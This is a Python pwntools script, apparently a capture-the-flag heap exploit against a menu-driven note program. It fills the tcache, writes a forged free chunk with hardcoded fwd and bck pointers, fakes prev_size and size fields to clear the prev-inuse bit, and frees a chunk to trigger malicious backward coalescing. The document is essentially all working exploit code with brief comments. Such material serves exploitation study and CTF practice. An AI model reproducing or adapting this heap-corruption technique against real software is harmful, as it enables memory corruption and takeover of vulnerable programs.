from pwn import *

e = ''

def alloc(size):
    global e
    if size <= 240:
        e += "1\n1\n{}\n".format(size)
    elif size >= 272 and size <= 480:
        e += "1\n2\n{}\n".format(size)
    else:
        raise Exception("Invalid size {}".format(size))

def write(page, content):
    global e
    e += "2\n{}\n{}\n".format(page, content)

def read(page):
    global e
    e += "3\n{}\n".format(page)

def burn(page):
    global e
    e += "4\n{}\n".format(page)

def run():
    global e
    print(e)

# Get rid of the unnecessary Tcache complication by allocating freeing enough chunks to fill the cache
for i in range(8):
    alloc(344)

# Write to all the chunks to make them all size 0x100 to fill cache
for i in range(8):
    write(i, 'A'*344)

#----------------------------------------------------------------------------------------------------

# Make a chunk that can overwrite the next chunk and set the prev-inuse bit to 0, so that it'll try
# to coalesce the next chunk with this one when the next one is freed
alloc(344)

# Setup block data as if this were a free chunk
freeblock = ""

# bck pointer
freeblock += p64(0x555555757d90)

# fwd pointer
freeblock += p64(0x555555757db0)

# Filler data
freeblock += 'D' * 320

# Prev size
freeblock += p64(0x160)

#----------------------------------------------------------------------------------------------------

# Make the chunk that will be freed
alloc(344)

# Setup fake block (since size got changed to 0x100)
fakeblock = 'P'*240

# Fake prev_size
fakeblock += p64(256)

# Fake block size
fakeblock += p64(0x61)

#----------------------------------------------------------------------------------------------------

write(8, freeblock)
write(9, fakeblock)

# Add one more chunk to keep the last chunk from being joined with top
alloc(344)

# Free the first 8 chunks to fill Tcache
for i in range(8):
    burn(i)

# Free the exploit chunk
burn(9)

run()
